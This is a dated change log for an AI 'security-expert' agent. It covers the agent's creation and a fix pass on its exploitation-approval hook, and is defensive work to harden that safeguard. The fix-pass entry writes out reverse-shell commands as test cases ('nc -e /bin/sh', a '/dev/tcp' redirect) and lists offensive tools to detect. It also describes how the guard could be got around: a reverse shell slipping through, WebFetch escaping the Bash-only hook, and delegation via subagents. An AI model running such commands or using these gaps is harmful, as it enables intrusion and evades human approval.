# Kaizen — Change History: security-expert

> Dated log of actual changes to the `security-expert` agent. Most recent first.

## 2026-08-23 — Prompt-waste Stage B wave 2: freshness clause + commit grant + capture intro compressed to pilot shapes
- **What:** CPG-freshness clause, the "Bash's one other narrow write action" commit-grant bullet (its distinctive lead kept), and the learning-capture intro compressed to the pilot-validated wordings (`claude/docs/plans/prompt-waste-reduction.md` v4, §3 doctrine + Stage B). The capture tail was already the compressed form — this agent postdates the inbox era and never carried the inbox-replacement sentence.
- **Removed (class 5/6, on standing record):** the grant's "same as before. Stakeholder decision, 2026-08-21 — see `kaizen/history.md`" — this file's 2026-08-21 grant entry; the freshness clause's "(2026-08-19 convention, same as `analyst`/`architect`)" and "without re-deriving staleness yourself" — the centralization is the standing convention in `docs/plans/cpg-agent-adoption2.md` and `claude/teco/kaizen/history.md` (2026-08-19); the intro's ":Agent node it's `PRODUCED`-linked to" mechanics restatement (mechanics live in the Cypher template below); the grant parenthetical's "— not spawned via `Agent`/`Task` as an isolated delegate" (moved into the carve-out sentence).
- **Gate (a) inventory — all preserved:** grant scope (own findings report, explicit path), full never-list, delegated-subagent carve-out + audit check-8 tokens, the freshness rule's distinct lead kept ("`teco`'s responsibility **when it dispatched you**" — this agent isn't always teco-dispatched) with both branches, Cypher template + call line verbatim, "raw capture: `cobb` promotes; never edit your own definition".
- **Verified:** `audit-team.sh` PASS; cobb §7 lint pass.

## 2026-08-21 — Interactive-mode commit grant added (team-wide stakeholder decision)
- **What:** New Guardrails bullet: when running interactively (`claude --agent security-expert`,
  a human present turn-by-turn — not a delegated subagent), may `git add`/`git commit` its own
  findings report from the session, by explicit path, never bulk-staged/pushed/reset/rebased/
  amended; the grant does not apply when spawned as a delegated subagent — separate from, and
  additive to, the existing FR-10 exploitation-approval gate, which is unaffected.
- **Why:** Direct stakeholder ruling, 2026-08-21, after `tico` hit exactly this gap closing out a
  Mode-3 verification pass (its own commissioned artifacts left uncommitted, since only
  `tico`/`teco` had any commit authority). Rather than pin the fix to those two, the stakeholder
  ruled the exception should reach every agent, gated by invocation mode, not identity — full
  rationale, the `claude/AGENTS.md` rewrite, and the `audit-team.sh` check-8 redesign in
  `claude/cobb/kaizen/history.md`, 2026-08-21 entry.
- **Verified:** `bash claude/scripts/audit-team.sh` — clean, all 13 agents pass check 8.
- **Plan items:** none opened — direct implementation of an explicit stakeholder decision.

## 2026-08-20 — Fix pass on analyst's independent review (`claude/docs/reviews/security-expert.md`): three FR-10 majors + one cheap minor

- **What:** `analyst`'s review of the newly-created agent (same day, "approve with suggestions",
  no blocker) found three **major** findings, all inside the FR-10 exploitation gate, routed back
  by `teco` for a fix pass before acceptance. Fixed all three, plus the one cheap **minor**;
  left the second minor (the `Agent`-tool delegation bypass) parked as directed — it's a
  pre-existing, team-wide structural gap (`devops`/`graph-dba`/`qa-engineer` share it for their
  own guards), not specific to this deliverable.
  1. **`nc`/`ncat`/`netcat` reverse-shell bypass.** `hooks/guard-exploitation-approval.sh` used to
     fold `nc`/`ncat`/`netcat` into the marker-exempt `NETCLIENT` branch, so `nc -e /bin/sh
     127.0.0.1 4444` (a standard reverse-shell client invocation) sailed through unescalated
     whenever a local marker was present — contradicting the hook's own stated "ask every time,
     local/dev included" principle, which was already implemented for the `TOOLS`/`LISTENER`
     branches but not this one. Fix: removed `nc`/`ncat`/`netcat` from `NETCLIENT` entirely;
     added two new **unconditional** (no marker exemption) branches — (a) `nc`/`ncat`/`netcat`
     carrying a shell-spawn flag (`-e`/`-c`/`--exec`/`--sh-exec`), (b) a `/dev/tcp` redirect
     combined with `>&`/`<&` (the shell-native reverse-shell technique that needs no `nc` binary
     at all — added as a cheap extension the review invited). `curl`/`wget`/`ssh`/`telnet` stay in
     the marker-exempt branch unchanged, per the review's explicit confirmation that ambiguity is
     handled correctly there.
  2. **FR-10's ritual was Bash-only in the prompt, but `WebFetch` is also in the toolset.**
     `WebFetch` can carry a GET-based exploitation probe (reflected XSS/SQLi/path-traversal/SSRF
     in a query string) against a local `salesperson`/`falkor-chat` instance with no ritual
     attached — a gap in the *primary control* (prompt discipline), not just the harness backstop.
     Fix: widened the "Active exploitation (FR-10)" section and the matching Guardrails bullet in
     `security-expert.md` to explicitly cover any `WebFetch` call reaching a live target,
     alongside Bash, and to say plainly that the harness hook still watches Bash only today
     (extending it to `WebFetch` is a new `kaizen/plan.md` follow-up, not done in this pass, per
     the review's own "secondary to the prompt fix" framing).
  3. **Ordinary investigative greps for `curl`/`wget`/`ssh` tripped the guard.** The old
     `NETCLIENT` match scanned the whole command string for the tool name anywhere, including
     inside a quoted grep pattern (`grep -rn "curl" devops/scripts/` escalated), contradicting the
     prompt's own claim that ordinary Bash investigation "needs no special ceremony" and risking
     reflexive-approval erosion on the one gate built around "never standing consent." Fix:
     anchored the marker-exempt branch's match on the tool name appearing as an actual command
     verb — start of command, or immediately after a shell separator (`;`, `&&`, `||`, `|`,
     backtick, `$(`) — instead of anywhere in the string, mirroring the anchoring discipline
     `guard-destructive-ops.sh`'s `pipeline.sh --reset` branch already uses (including its
     two-independent-greps-ANDed pattern, to avoid the same ordering bug that branch's own history
     warns about).
  4. **Cheap minor:** `skills/cpg-analysis/SKILL.md`'s frontmatter `description` consumer list
     added `security-expert` (previously listed only "analyst, architect, qa-engineer, coder,
     tdd-engineer, or frontend-engineer" despite FR-2 making this agent a real consumer). Logged
     here rather than in `graph-dba/kaizen/history.md` since it's this fix pass's own follow-up,
     not a `cpg-analysis` design change — `skills/README.md`'s "owner-agent's history" convention
     for skill edits is itself still informally applied (`cobb/kaizen/plan.md` K-014), and this
     edit's causal owner is squarely this fix pass.
- **Verified:** re-ran `analyst`'s exact reproduction commands directly against the fixed hook —
  `nc -e /bin/sh 127.0.0.1 4444` and `nc 127.0.0.1 4444 -e /bin/bash` now escalate (previously
  silent); `grep -rn "curl" devops/scripts/` and `cat app.py | grep wget` now pass silently
  (previously escalated). Also spot-checked `ncat --sh-exec ... host.docker.internal` and
  `bash -i >& /dev/tcp/10.0.0.5/4444 0>&1` (both correctly escalate, unconditional) and a plain
  `nc -zv localhost 8000` port-check (correctly still passes — the fix is scoped to shell-spawn
  flags, not blanket `nc` coverage, per the finding's own wording). Full regression re-run of
  every earlier test case (benign grep/pytest, local curl/ssh, external curl, sqlmap, nc listener,
  nmap against a local marker) plus three new command-verb-anchor sanity checks (`curl` after
  `&&`, after `|`, and at string start — all correctly still escalate when non-local) — no
  regressions. `bash -n` clean. `bash claude/scripts/audit-team.sh` — 110 PASS / 2 pre-existing
  FAIL, identical to the pre-fix run (same two hits, `falkor-chat/docs/test-reports/
  graphrag-eval-report.md`, committed 2026-08-16, untouched by this session).
- **Why:** `teco` routed `analyst`'s review findings back for a fix pass before accepting the
  unit — all three majors live inside FR-10, the one genuinely high-stakes capability on this
  team, and were judged cheap/concrete enough to fix immediately rather than defer.
- **Plan items:** K-002 (pattern-catalog revisit after real use) is partially addressed by this
  pass; left open. New: extend `guard-exploitation-approval.sh` to also watch `WebFetch` calls
  (review's own "reasonable follow-up, secondary to the prompt fix") — added to `kaizen/plan.md`.

## 2026-08-20 — Created

- **What:** New agent, designed by `cobb` against `claude/docs/requirements/security-expert.md`
  (`Status: Ready for design`, confirmed by the `tico` interview it records) — closing
  `cobb/kaizen/plan.md` item **K-016**. Four on-demand review capabilities, all advisory, none a
  standing gate:
  1. **Code/app security review (FR-1/FR-2)** — deeper than `analyst`'s security/perf checklist
     line; uses the `cpg-analysis` skill for data-flow/injection-path analysis when a CPG exists
     for the component under review, via `mcp__cypher__query` (explicit `tools:` entry — this
     agent declares an allowlist, so the MCP tool needed listing by name to be visible).
  2. **Agent/prompt-safety review (FR-3)** — kaizen entries, agent/skill prompts, plans/requirements
     docs, for instruction-poisoning-shaped writing. The prompt distills the operative heuristic
     directly from the 2026-07-31 incident this requirement exists to close
     (`claude/analyst/kaizen/history.md`, `claude/cobb/kaizen/history.md`): the distinguishing
     question is whether an artifact's *framing* teaches evasion-shaped reasoning as reusable
     precedent, not just whether the underlying action was benign.
  3. **Secrets/infra-hardening audit (FR-4)** — advisory to `devops`.
  4. **Compliance/audit checklist (FR-5)** — no mandated external framework (stakeholder decision
     in the requirements doc).
  Findings for #1/#3/#4 and #2 route to their respective owners as opinions, never directives
  (FR-6/FR-8/FR-9): `analyst`'s existing check is unaffected, `cobb` keeps final promotion
  authority, `devops` keeps final infra/secrets authority.
- **FR-10 (active exploitation) — the real design decision this agent needed.** Local/dev targets
  only, fresh explicit approval for every single attempt, no standing consent. Two-part
  enforcement, same split as every other guarded agent on this team: prompt-level discipline is
  primary (state target/technique/blast radius, wait, every time), a `PreToolUse` `Bash` hook is
  the backstop. **Chose a standalone new script, `hooks/guard-exploitation-approval.sh`, over
  reusing or extending the shared `scripts/guard-destructive-ops.sh` core** that
  `devops`/`graph-dba`/`qa-engineer` already share: that core's catalog is
  shared-state-destruction literals (`GRAPH.DELETE`, `FLUSHALL`, volume wipes, `docker rm -f`) —
  a different hazard class from offensive-security-tool/network-exploitation invocations, with a
  different (and likely faster-growing) pattern list and a different maintainer concern. Merging
  them would couple this agent's exploit-tool catalog to three unrelated agents' shared-state
  guard. The new script matches on (a) named offensive-security tool binaries (sqlmap, nmap,
  msfconsole, msfvenom, hydra, medusa, nikto, gobuster, dirbuster, ffuf, wpscan, searchsploit,
  hashcat), (b) listener/reverse-shell setups (`nc -l`/`ncat -l`/`netcat -l`), and (c) a
  network-reaching client (curl/wget/nc/ncat/netcat/ssh/telnet) whose command text carries no
  visible local/dev marker (`localhost`/`127.0.0.1`/`::1`/`0.0.0.0`/`host.docker.internal`) —
  erring toward asking, the same safe-failure direction every guard in this team already takes.
  Verified: `bash -n` on both hook scripts, plus 8 manual test cases through the exploitation
  guard (benign grep/pytest pass silently; local curl/ssh with a `127.0.0.1`/`localhost` marker
  pass silently; external curl, `sqlmap`, an `nc` listener, and `nmap` against
  `host.docker.internal` all correctly escalate — `nmap` asks even against a local marker,
  correct, since FR-10 requires approval every time regardless of target).
- **Tools/frontmatter:** explicit `tools:` allowlist (`Read, Grep, Glob, Bash, Write, Edit,
  WebFetch, WebSearch, Agent, mcp__cypher__query`), matching `analyst`'s shape — the closest
  sibling (reviewer, writes findings docs, uses Bash for investigation). `permissionMode:
  acceptEdits` (team-wide convention). Two `PreToolUse` hooks under one frontmatter `hooks:` block
  (`Write|Edit` → `guard-review-doc-writes.sh`, a thin wrapper over the shared
  `scripts/guard-doc-writes.sh` core scoped to `docs/reviews/*` only — no kaizen `inbox.md` glob
  needed, since this agent has none per FR-12/AC-9; `Bash` → the new
  `guard-exploitation-approval.sh`).
- **Kaizen:** seeded `kaizen/{plan,history}.md` only — no `inbox.md` (agent created after the
  2026-08-20 shared-graph consolidation; Learning capture writes straight into `kaizen_team`,
  `author: 'security-expert'`).
- **Team-wide edits in the same change** (boundary-pair symmetry + roster/catalog currency,
  per the `agent-maintenance` skill and `claude/scripts/audit-team.sh` check 6):
  - `claude/scripts/audit-team.sh` `BOUNDARY_PAIRS` gained `security-expert:analyst`,
    `security-expert:cobb`, `security-expert:devops` (the three boundaries the requirements doc's
    FRs actually name — not `qa-engineer`, see `kaizen/plan.md`'s parking-lot note).
  - `claude/analyst/analyst.md`, `claude/cobb/cobb.md`, `claude/devops/devops.md` — each
    `description` gained a short reciprocal clause naming `security-expert`.
  - `claude/teco/teco.md` — new routing-table row + handoff-contract line (deliverable path
    `<component>/docs/reviews/<slug>.md`, same as `analyst`).
  - `claude/README.md` — new catalog row. `claude/AGENTS.md` — added to the "Agents" roster
    paragraph and to "Hook machinery" (the new agent-owned, non-shared-core `Bash` guard, noted as
    a departure from the two existing shared cores).
  - Root `AGENTS.md` — checked, no change needed: it doesn't enumerate individual agent names
    (only describes the `claude/` component generally; the roster lives in `claude/AGENTS.md` +
    `claude/README.md`, per `audit-team.sh` check 5b).
- **Why:** `tico`-interview requirements doc reached `Status: Ready for design` on 2026-08-17 with
  no design pass run against it (`cobb/kaizen/plan.md` K-016, added 2026-08-19 during an unrelated
  distillation pass). This dispatch executes that backlog item.
- **Verified:** `bash claude/scripts/audit-team.sh` — see the same-date `cobb/kaizen/history.md`
  entry for the full run output and any follow-up fixes.
- **Plan items:** K-001/K-002/K-003 above; parking-lot judgment calls for a future reviewer to
  double-check.
